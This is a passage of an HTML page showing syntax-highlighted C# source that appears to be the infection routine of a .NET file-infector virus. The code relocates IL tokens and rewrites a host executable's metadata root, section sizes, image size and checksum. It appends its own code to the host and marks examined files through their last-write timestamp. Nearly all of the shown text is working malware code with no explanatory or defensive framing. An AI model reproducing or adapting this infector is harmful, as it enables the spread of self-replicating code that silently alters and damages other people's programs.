                                                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x27</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* jmp, call */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x6f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* calli, callvirt, cpobj, ldobj, ldstr, newobj, castclass, isinst */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x79</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* unbox */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x7b</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldfld, ldflda, stfld, ldsfld, ldsflda, stsfld, stobj */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x8c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* box, newarr */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x8f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldelema */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xc2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* refanyval */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xc6</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* mkrefany */</span><span class="sc0">
                                                                      </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xd0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldtoken */</span><span class="sc0">
                                                                        </span><span class="sc10">)</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mrefdelta</span><span class="sc10">);</span><span class="sc0">
                                                                    </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x45</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* switch */</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xfe</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* prefix1 */</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">codecopy</span><span class="sc10">[</span><span class="sc11">blobind</span><span class="sc10">++])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x12</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* unaligned */</span><span class="sc0">
                                                                    </span><span class="sc10">{</span><span class="sc0">
                                                                        </span><span class="sc10">++</span><span class="sc11">blobind</span><span class="sc10">;</span><span class="sc0">
                                                                    </span><span class="sc10">}</span><span class="sc0">
                                                                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x06</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldftn, ldvirtftn */</span><span class="sc0">
                                                                          </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x15</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* initobj */</span><span class="sc0">
                                                                          </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x1c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* sizeof */</span><span class="sc0">
                                                                            </span><span class="sc10">)</span><span class="sc0">
                                                                    </span><span class="sc10">{</span><span class="sc0">
                                                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">mrefdelta</span><span class="sc10">);</span><span class="sc0">
                                                                        </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
                                                                    </span><span class="sc10">}</span><span class="sc0">
                                                                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">UInt32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">opcode</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">0x09</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc1">/* ldarg, ldarga, starg, ldloc, ldloca, stloc */</span><span class="sc0">
                                                                    </span><span class="sc10">{</span><span class="sc0">
                                                                        </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt16</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">localsdelta</span><span class="sc10">));</span><span class="sc0">
                                                                        </span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
                                                                    </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">

                                                                </span><span class="sc1">/* variable 2: size of our code */</span><span class="sc0">
                                                            </span><span class="sc10">}</span><span class="sc0">
                                                            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0x02626772</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* update host Metadata root RVA and size */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt64</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">Int64</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blobnew</span><span class="sc10">.</span><span class="sc11">GetLength</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">0x20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sectsize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x0f</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">)));</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">rootptroff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* update host last section virtual size */</span><span class="sc0">

                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* update host last section raw size */</span><span class="sc0">

                                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x3c</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc11">baseind</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">lastsect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* update host image size */</span><span class="sc0">

                                                            </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x38</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rva</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">baseind</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">~</span><span class="sc11">baseind</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x58</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">lfanew</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">);</span><span class="sc0">

                                                            </span><span class="sc1">/* append our data */</span><span class="sc0">

                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">End</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">rootold</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sigoff</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">codecopy</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sectcopy</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(((</span><span class="sc11">Int32</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SeekOrigin</span><span class="sc10">.</span><span class="sc11">Current</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">rootnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">siglen</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">blobnew</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobind</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">SetLength</span><span class="sc10">(</span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x0c</span><span class="sc10">));</span><span class="sc0">

                                                            </span><span class="sc1">/* recalculate checksum, if required */</span><span class="sc0">

                                                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                                                            </span><span class="sc10">{</span><span class="sc0">
                                                                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                                </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
                                                                </span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">blobtotal</span><span class="sc10">;</span><span class="sc0">

                                                                </span><span class="sc5">do</span><span class="sc0">
                                                                </span><span class="sc10">{</span><span class="sc0">
                                                                    </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Read</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
                                                                    </span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">BitConverter</span><span class="sc10">.</span><span class="sc11">ToInt16</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">);</span><span class="sc0">
                                                                </span><span class="sc10">}</span><span class="sc0">
                                                                </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">baseind</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

                                                                </span><span class="sc11">Marshal</span><span class="sc10">.</span><span class="sc11">WriteInt32</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">blobtotal</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Int16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">raw</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">0x10</span><span class="sc10">));</span><span class="sc0">
                                                                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">lfanew</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc1">/* 0 == SeekOrigin.Begin */</span><span class="sc0">
                                                                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
                                                            </span><span class="sc10">}</span><span class="sc0">
                                                        </span><span class="sc10">}</span><span class="sc0">
                                                    </span><span class="sc10">}</span><span class="sc0">
                                                </span><span class="sc10">}</span><span class="sc0">
                                            </span><span class="sc10">}</span><span class="sc0">
                                        </span><span class="sc10">}</span><span class="sc0">
                                    </span><span class="sc10">}</span><span class="sc0">
                                </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc11">fs</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">

                </span><span class="sc1">/* mark every file that was examined, even if not infected
                   last write time is used because is kept on file copy
                */</span><span class="sc0">

                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetLastWriteTime</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lastwrite</span><span class="sc10">.</span><span class="sc11">AddSeconds</span><span class="sc10">(-</span><span class="sc11">lastwrite</span><span class="sc10">.</span><span class="sc11">Second</span><span class="sc10">));</span><span class="sc0">
                </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">SetAttributes</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">attr</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
